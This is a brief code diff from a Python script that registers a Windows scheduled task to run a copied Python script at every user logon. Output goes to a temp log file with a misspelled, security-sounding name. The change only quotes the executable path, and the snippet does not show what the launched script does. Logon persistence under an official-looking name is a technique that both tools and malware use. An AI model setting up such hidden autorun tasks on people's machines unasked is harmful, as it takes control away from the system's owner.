@@ -50,7 +50,7 @@ subprocess.run(
         "/sc", "onlogon",
         "/ru", os.getlogin(),
         "/tn", USER_TASK_NAME,
-        "/tr", f'{PYTHON_EXE} "{USER_DST}" >> %temp%\\SecutiryServicesLogsUser.txt 2>&1'
+        "/tr", f'"{PYTHON_EXE}" "{USER_DST}" >> %temp%\\SecutiryServicesLogsUser.txt 2>&1'
     ],
     check=True
 )
